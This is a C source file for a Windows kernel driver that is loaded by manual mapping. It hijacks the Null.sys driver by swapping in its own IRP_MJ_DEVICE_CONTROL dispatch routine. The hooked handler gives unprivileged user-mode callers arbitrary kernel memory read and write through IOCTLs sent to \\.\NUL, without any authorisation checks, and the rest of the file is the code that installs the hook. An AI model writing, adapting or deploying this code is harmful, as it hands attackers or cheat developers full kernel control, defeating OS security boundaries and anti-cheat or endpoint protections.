#include "main.h"

//
// Globals
//
static PDRIVER_DISPATCH g_OriginalDeviceControl = NULL;
static PDRIVER_OBJECT g_NullDriverObject = NULL;

// ============================================================================
// Hooked IRP_MJ_DEVICE_CONTROL handler
// ============================================================================
NTSTATUS HookedDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
  PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
  ULONG ioctl = irpStack->Parameters.DeviceIoControl.IoControlCode;
  ULONG inLength = irpStack->Parameters.DeviceIoControl.InputBufferLength;
  PVOID buffer = Irp->AssociatedIrp.SystemBuffer;
  NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
  ULONG bytesOut = 0;

  switch (ioctl) {
  // ------------------------------------------------------------------
  // PING: Simple check to see if the driver is alive.
  // Returns STATUS_SUCCESS.
  // ------------------------------------------------------------------
  case IOCTL_HIJACK_PING: {
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
               "[Hijack] PING received. Driver is alive.\n");
    status = STATUS_SUCCESS;
    break;
  }

  // ------------------------------------------------------------------
  // READ: Copy kernel memory to user-mode buffer.
  // ------------------------------------------------------------------
  case IOCTL_HIJACK_READ_MEM: {
    if (inLength < sizeof(KERNEL_READ_REQUEST) || buffer == NULL) {
      status = STATUS_INVALID_PARAMETER;
      break;
    }

    PKERNEL_READ_REQUEST req = (PKERNEL_READ_REQUEST)buffer;

    if (req->Size == 0 || req->SourceAddress == 0 || req->TargetAddress == 0) {
      status = STATUS_INVALID_PARAMETER;
      break;
    }

    __try {
      // Probe user buffer
      ProbeForWrite((PVOID)req->TargetAddress, req->Size, 1);

      RtlCopyMemory((PVOID)req->TargetAddress, (PVOID)req->SourceAddress,
                    req->Size);

      req->Status = STATUS_SUCCESS;
      status = STATUS_SUCCESS;
      bytesOut = sizeof(KERNEL_READ_REQUEST);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
      req->Status = GetExceptionCode();
      status = req->Status;
      DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                 "[Hijack] READ exception: 0x%08X\n", status);
    }
    break;
  }

  // ------------------------------------------------------------------
  // WRITE: Copy user-mode buffer into kernel memory.
  // ------------------------------------------------------------------
  case IOCTL_HIJACK_WRITE_MEM: {
    if (inLength < sizeof(KERNEL_WRITE_REQUEST) || buffer == NULL) {
      status = STATUS_INVALID_PARAMETER;
      break;
    }

    PKERNEL_WRITE_REQUEST req = (PKERNEL_WRITE_REQUEST)buffer;

    if (req->Size == 0 || req->SourceAddress == 0 || req->TargetAddress == 0) {
      status = STATUS_INVALID_PARAMETER;
      break;
    }

    __try {
      // Probe user buffer
      ProbeForRead((PVOID)req->SourceAddress, req->Size, 1);

      RtlCopyMemory((PVOID)req->TargetAddress, (PVOID)req->SourceAddress,
                    req->Size);

      req->Status = STATUS_SUCCESS;
      status = STATUS_SUCCESS;
      bytesOut = sizeof(KERNEL_WRITE_REQUEST);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
      req->Status = GetExceptionCode();
      status = req->Status;
      DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                 "[Hijack] WRITE exception: 0x%08X\n", status);
    }
    break;
  }

  // ------------------------------------------------------------------
  // Unknown IOCTL: Forward to original Null.sys handler
  // ------------------------------------------------------------------
  default: {
    if (g_OriginalDeviceControl) {
      return g_OriginalDeviceControl(DeviceObject, Irp);
    }
    status = STATUS_INVALID_DEVICE_REQUEST;
    break;
  }
  }

  Irp->IoStatus.Status = status;
  Irp->IoStatus.Information = bytesOut;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return status;
}

// ============================================================================
// HijackNull - Locate Null.sys DRIVER_OBJECT and swap dispatch table
// ============================================================================
NTSTATUS HijackNull(VOID) {
  NTSTATUS status;
  UNICODE_STRING nullDriverName;

  RtlInitUnicodeString(&nullDriverName, L"\\Driver\\Null");

  // Get a reference to the Null.sys driver object
  status = ObReferenceObjectByName(&nullDriverName, OBJ_CASE_INSENSITIVE, NULL,
                                   0, *IoDriverObjectType, KernelMode, NULL,
                                   (PVOID *)&g_NullDriverObject);

  if (!NT_SUCCESS(status)) {
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
               "[Hijack] Failed to find \\Driver\\Null: 0x%08X\n", status);
    return status;
  }

  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
             "[Hijack] Found Null.sys DRIVER_OBJECT at 0x%p\n",
             g_NullDriverObject);

  // Backup and replace the IRP_MJ_DEVICE_CONTROL handler
  g_OriginalDeviceControl =
      g_NullDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];

  g_NullDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] =
      HookedDeviceControl;

  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
             "[Hijack] IRP_MJ_DEVICE_CONTROL hijacked!\n"
             "         Original handler: 0x%p\n"
             "         New handler:      0x%p\n",
             g_OriginalDeviceControl, HookedDeviceControl);

  // Release our reference (the driver object is still alive)
  ObDereferenceObject(g_NullDriverObject);

  return STATUS_SUCCESS;
}

// ============================================================================
// DriverEntry - Manual map compatible entry point
// ============================================================================
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
                     _In_ PUNICODE_STRING RegistryPath) {
  UNREFERENCED_PARAMETER(DriverObject);
  UNREFERENCED_PARAMETER(RegistryPath);

  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
             "[Hijack] DriverEntry called. Manual mapping successful!\n");

  NTSTATUS status = HijackNull();

  if (NT_SUCCESS(status)) {
    DbgPrintEx(
        DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
        "[Hijack] Null.sys successfully hijacked. Send IOCTLs to \\\\.\\NUL\n");
  } else {
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
               "[Hijack] Failed to hijack Null.sys: 0x%08X\n", status);
  }

  // Return SUCCESS so the mapper knows we loaded fine.
  // We do NOT need an Unload routine since we are manually mapped.
  return status;
}
